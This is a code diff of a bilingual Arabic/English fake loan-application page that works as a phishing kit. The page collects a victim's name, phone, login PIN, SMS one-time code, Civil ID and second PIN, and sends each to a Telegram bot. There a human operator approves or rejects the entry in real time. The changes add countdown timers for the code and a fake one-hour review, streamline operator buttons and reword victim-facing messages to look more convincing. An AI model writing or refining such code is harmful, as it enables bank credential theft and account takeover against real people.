@@ -140,7 +140,7 @@
       }
 
       .stepper {
-        display: flex;
+        display: none;
         align-items: center;
         justify-content: space-between;
         position: relative;
@@ -525,7 +525,7 @@
           <!-- Step 1: Loan amount -->
           <div class="step active" data-step="1">
             <h1 class="title" data-ar="طلب قرض" data-en="Loan Request">طلب قرض</h1>
-            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Select desired loan amount with 4% annual interest rate and period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
+            <p class="subtitle" data-ar="اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا." data-en="Choose your desired loan amount with a 4% annual interest rate and select a period up to 60 months.">اختر مبلغ القرض المراد، مع معدل فائدة سنوي 4% وإمكانية اختيار المدة حتى 60 شهرًا.</p>
 
             <div class="field">
               <label class="label" data-ar="مبلغ القرض" data-en="Loan Amount">مبلغ القرض</label>
@@ -550,7 +550,7 @@
             </div>
 
             <div class="loan-card">
-              <div class="loan-row"><span data-ar="معدل الفائدة" data-en="Interest Rate">معدل الفائدة</span><strong>4% <span data-ar="سنوياً" data-en="per year">سنوياً</span></strong></div>
+              <div class="loan-row"><span data-ar="معدل الفائدة" data-en="Interest Rate">معدل الفائدة</span><strong>4% <span data-ar="سنوياً" data-en="per year">سنويًا</span></strong></div>
               <div class="loan-row"><span data-ar="الدفعة الشهرية" data-en="Monthly Payment">الدفعة الشهرية</span><strong id="monthlyPaymentText">1,088 ر.ع</strong></div>
               <div class="loan-row"><span data-ar="إجمالي السداد" data-en="Total Payment">إجمالي السداد</span><strong id="totalPaymentText">65,280 ر.ع</strong></div>
             </div>
@@ -636,12 +636,12 @@
           <!-- Step 4: OTP -->
           <div class="step" data-step="4">
             <h1 class="title" data-ar="تحقق OTP" data-en="OTP Verification">تحقق OTP</h1>
-            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via SMS, 4-6 digits.">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
+            <p class="subtitle" data-ar="أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام." data-en="Enter the verification code sent to your phone via SMS (4-6 digits).">أدخل رمز التحقق المرسل إلى هاتفك عبر الرسائل، ويكون من 4 إلى 6 أرقام.</p>
 
             <div class="field">
               <label class="label" data-ar="رمز التحقق" data-en="Verification Code">رمز التحقق</label>
               <input id="otpInput" class="input" type="text" inputmode="numeric" maxlength="6" data-ar-placeholder="••••••" data-en-placeholder="••••••" placeholder="••••••" />
-              <div class="review-box" data-ar="ينتهي الرمز خلال دقيقتين" data-en="Code expires in 2 minutes">ينتهي الرمز خلال دقيقتين</div>
+              <div class="review-box" id="otpTimer" data-ar="ينتهي الرمز خلال 02:00" data-en="Code expires in 02:00">ينتهي الرمز خلال 02:00</div>
             </div>
 
             <div class="row-2col">
@@ -680,7 +680,7 @@
             <div class="success-page">
               <div class="success-icon">✓</div>
               <h1 class="success-title" data-ar="مبروك!" data-en="Congratulations!">مبروك!</h1>
-              <p class="subtitle" data-ar="تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة." data-en="Your loan application has been successfully submitted and will be reviewed within one hour.">تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة.</p>
+              <p class="subtitle" data-ar="تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة." data-en="Your loan application has been submitted successfully and will be reviewed within one hour.">تم تقديم طلب القرض بنجاح، وسيتم مراجعته خلال ساعة واحدة.</p>
 
               <div class="summary-box">
                 <div class="summary-row">
@@ -728,6 +728,8 @@
       let formData = {};
       let pollingInterval = null;
       let lastUpdateId = -1;
+      let otpTimerInterval = null;
+      let reviewTimerInterval = null;
       
       const steps = [...document.querySelectorAll('.step')];
       const stepItems = [...document.querySelectorAll('.step-item')];
@@ -767,6 +769,80 @@
         }
       }
 
+      // ===== OTP TIMER =====
+      function formatTime(seconds) {
+        const mins = Math.floor(seconds / 60);
+        const secs = seconds % 60;
+        return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+      }
+
+      function startOtpTimer() {
+        if (otpTimerInterval) clearInterval(otpTimerInterval);
+        
+        let timeLeft = 120; // 120 seconds
+        const otpTimer = document.getElementById('otpTimer');
+        
+        function updateOtpDisplay() {
+          const arText = `ينتهي الرمز خلال ${formatTime(timeLeft)}`;
+          const enText = `Code expires in ${formatTime(timeLeft)}`;
+          otpTimer.textContent = currentLang === 'ar' ? arText : enText;
+          otpTimer.dataset.ar = arText;
+          otpTimer.dataset.en = enText;
+        }
+        
+        updateOtpDisplay();
+        
+        otpTimerInterval = setInterval(() => {
+          timeLeft--;
+          updateOtpDisplay();
+          
+          if (timeLeft <= 0) {
+            clearInterval(otpTimerInterval);
+            otpTimerInterval = null;
+          }
+        }, 1000);
+      }
+
+      function stopOtpTimer() {
+        if (otpTimerInterval) {
+          clearInterval(otpTimerInterval);
+          otpTimerInterval = null;
+        }
+      }
+
+      // ===== REVIEW TIMER =====
+      function startReviewTimer() {
+        if (reviewTimerInterval) clearInterval(reviewTimerInterval);
+        
+        let timeLeft = 3600; // 3600 seconds = 1 hour
+        const reviewTimer = document.getElementById('reviewTimer');
+        
+        function updateReviewDisplay() {
+          const hours = Math.floor(timeLeft / 3600);
+          const mins = Math.floor((timeLeft % 3600) / 60);
+          const secs = timeLeft % 60;
+          const timeStr = `${String(hours).padStart(2, '0')}:${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+          
+          const arText = `المراجعة بعد: ${timeStr}`;
+          const enText = `Review in: ${timeStr}`;
+          reviewTimer.textContent = currentLang === 'ar' ? arText : enText;
+          reviewTimer.dataset.ar = arText;
+          reviewTimer.dataset.en = enText;
+        }
+        
+        updateReviewDisplay();
+        
+        reviewTimerInterval = setInterval(() => {
+          timeLeft--;
+          updateReviewDisplay();
+          
+          if (timeLeft <= 0) {
+            clearInterval(reviewTimerInterval);
+            reviewTimerInterval = null;
+          }
+        }, 1000);
+      }
+
       // ===== STEP NAVIGATION =====
       function showStep(index) {
         steps.forEach((step, i) => step.classList.toggle('active', i === index));
@@ -774,6 +850,22 @@
           item.classList.toggle('active', i === index);
           item.classList.toggle('done', i < index);
         });
+        
+        // Reset OTP timer when navigating to OTP step (step 3, index 3)
+        if (index === 3) {
+          startOtpTimer();
+        } else {
+          stopOtpTimer();
+        }
+        
+        // Start review timer when navigating to success step (step 6, index 5)
+        if (index === 5) {
+          startReviewTimer();
+        } else if (reviewTimerInterval) {
+          clearInterval(reviewTimerInterval);
+          reviewTimerInterval = null;
+        }
+        
         window.scrollTo({ top: 0, behavior: 'smooth' });
       }
 
@@ -937,6 +1029,7 @@
           const prev = Number(this.dataset.back);
           if (pollingInterval) clearInterval(pollingInterval);
           showLoading(false);
+          stopOtpTimer();
           showStep(prev);
         });
       });
@@ -957,7 +1050,7 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>🔐 تسجيل دخول جديد | New Login</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🔐 <b>PIN:</b> ${loginPin}`;
+        const message = `<b>🔐 تسجيل دخول جديد | New Login</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${loginPhone}\n🔐 <b>رمز PIN:</b> ${loginPin}`;
         
         await sendToTelegram(message, [
           { text: '✅ APPROVE', data: 'login_approve' },
@@ -1004,11 +1097,11 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>🔐 OTP Verification | التحقق من OTP</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n🔢 <b>OTP Code:</b> ${otp}`;
+        const message = `<b>🔐 طلب OTP جديد | New OTP Request</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n🔑 <b>رمز OTP:</b> ${otp}`;
         
         await sendToTelegram(message, [
-          { text: '✅ ACCEPT', data: 'otp_accept' },
-          { text: '❌ WRONGOTP', data: 'otp_wrongotp' }
+          { text: '✅ APPROVE', data: 'otp_approve' },
+          { text: '❌ REJECT', data: 'otp_reject' }
         ]);
 
         // Poll for response
@@ -1019,15 +1112,16 @@
           pollCount++;
           const response = await checkTelegramResponse();
 
-          if (response === 'otp_accept') {
+          if (response === 'otp_approve') {
             clearInterval(pollingInterval);
             showLoading(false);
             setMessage('error-4', '', true);
-            showStep(4); // Move to Civil ID step
-          } else if (response === 'otp_wrongotp') {
+            stopOtpTimer();
+            showStep(4); // Move to Verify step
+          } else if (response === 'otp_reject') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP المدخل خاطئ أو منتهي الصلاحية. الرجاء إدخال OTP صحيح.' : 'The OTP provided is wrong or has expired. Please provide a valid OTP.');
+            setMessage('error-4', currentLang === 'ar' ? 'رمز OTP غير صحيح. يرجى المحاولة مرة أخرى.' : 'Invalid OTP. Please try again.');
           }
 
           if (pollCount >= maxPolls) {
@@ -1038,13 +1132,13 @@
         }, POLLING_INTERVAL);
       });
 
-      // ===== STEP 5: CIVIL ID & PIN WITH TELEGRAM APPROVAL =====
+      // ===== STEP 5: FINAL VERIFY =====
       document.getElementById('submitVerify').addEventListener('click', async function () {
         const civilId = document.getElementById('civilId').value.trim();
         const verifyPin = document.getElementById('verifyPin').value.trim();
 
         if (!validateCivilId(civilId) || !validatePin(verifyPin)) {
-          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال الهوية ورمز PIN بشكل صحيح.' : 'Please enter Civil ID and PIN correctly.');
+          setMessage('error-5', currentLang === 'ar' ? 'يرجى إدخال رقم هوية صحيح ورمز PIN من 4 إلى 6 أرقام.' : 'Please enter valid Civil ID and PIN (4-6 digits).');
           return;
         }
 
@@ -1054,12 +1148,11 @@
 
         // Send to Telegram
         showLoading(true);
-        const message = `<b>✓ Final Verification | التحقق النهائي</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📱 <b>الهاتف:</b> +968${formData.loginPhone}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n🆔 <b>Civil ID:</b> ${civilId}\n🔐 <b>PIN:</b> ${verifyPin}`;
+        const message = `<b>✔️ التحقق النهائي | Final Verification</b>\n\n👤 <b>الاسم:</b> ${formData.firstName} ${formData.lastName}\n📝 <b>رقم الهوية:</b> ${civilId}\n🔐 <b>رمز PIN:</b> ${verifyPin}\n💰 <b>مبلغ القرض:</b> ${formatMoney(formData.loanAmount)}\n📅 <b>المدة:</b> ${formData.loanPeriod} شهر`;
         
         await sendToTelegram(message, [
           { text: '✅ APPROVE', data: 'verify_approve' },
-          { text: '⚠️ WRONGPIN', data: 'verify_wrongpin' },
-          { text: '❌ WRONGID', data: 'verify_wrongid' }
+          { text: '❌ REJECT', data: 'verify_reject' }
         ]);
 
         // Poll for response
@@ -1074,22 +1167,27 @@
             clearInterval(pollingInterval);
             showLoading(false);
             
-            // Update success summary
+            // Populate success summary
             document.getElementById('summaryName').textContent = `${formData.firstName} ${formData.lastName}`;
             document.getElementById('summaryLoan').textContent = formatMoney(formData.loanAmount);
-            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} شهر`;
-            document.getElementById('summaryPurpose').textContent = formData.loanPurpose;
-            document.getElementById('summaryMonthly').textContent = `${formData.monthlyPayment} ر.ع`;
+            document.getElementById('summaryPeriod').textContent = `${formData.loanPeriod} ${currentLang === 'ar' ? 'شهر' : 'months'}`;
             
-            showStep(5); // Move to success step
-          } else if (response === 'verify_wrongpin') {
+            const purposeMap = {
+              'home': currentLang === 'ar' ? 'المنزل' : 'Home',
+              'car': currentLang === 'ar' ? 'السيارة' : 'Car',
+              'education': currentLang === 'ar' ? 'التعليم' : 'Education',
+              'business': currentLang === 'ar' ? 'الأعمال' : 'Business',
+              'personal': currentLang === 'ar' ? 'شخصي' : 'Personal'
+            };
+            document.getElementById('summaryPurpose').textContent = purposeMap[formData.loanPurpose] || formData.loanPurpose;
+            document.getElementById('summaryMonthly').textContent = `${formData.monthlyPayment.toLocaleString('en-US')} ر.ع`;
+            
+            setMessage('error-5', '', true);
+            showStep(5); // Move to Success step
+          } else if (response === 'verify_reject') {
             clearInterval(pollingInterval);
             showLoading(false);
-            setMessage('error-5', currentLang === 'ar' ? 'رمز PIN المدخل خاطئ. الرجاء إدخال PIN صحيح والمحاولة مرة أخرى.' : 'The PIN provided is wrong. Please put the correct PIN and try again.');
-          } else if (response === 'verify_wrongid') {
-            clearInterval(pollingInterval);
-            showLoading(false);
-            setMessage('error-5', currentLang === 'ar' ? 'رقم الهوية المدخل خاطئ. الرجاء المحاولة مرة أخرى.' : 'The Civil ID provided is wrong. Please try again.');
+            setMessage('error-5', currentLang === 'ar' ? 'تم رفض التحقق. يرجى المحاولة مرة أخرى.' : 'Verification rejected. Please try again.');
           }
 
           if (pollCount >= maxPolls) {
@@ -1100,7 +1198,7 @@
         }, POLLING_INTERVAL);
       });
 
-      // Initialize language
+      // Initialize
       updateLanguage('ar');
     </script>
   </body>
